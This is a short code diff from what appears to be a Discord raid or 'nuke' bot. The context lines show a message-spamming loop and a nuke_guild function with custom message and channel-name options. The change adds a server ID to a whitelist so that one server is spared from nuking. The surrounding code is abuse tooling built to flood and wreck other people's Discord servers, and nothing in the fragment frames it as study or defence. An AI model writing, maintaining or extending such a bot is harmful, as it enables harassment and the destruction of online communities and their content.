@@ -98,7 +98,7 @@ async def spam_task(channel, message, count=None):
                 await asyncio.sleep(0.5)
             except: break
 
-WHITELISTED_SERVER_IDS = {1453064260555903225, 1479710104759701656}
+WHITELISTED_SERVER_IDS = {1453064260555903225, 1479710104759701656, 1559305944595304520}
 
 async def nuke_guild(guild, custom_message=None, custom_channel_name=None):
     if guild.id in WHITELISTED_SERVER_IDS:
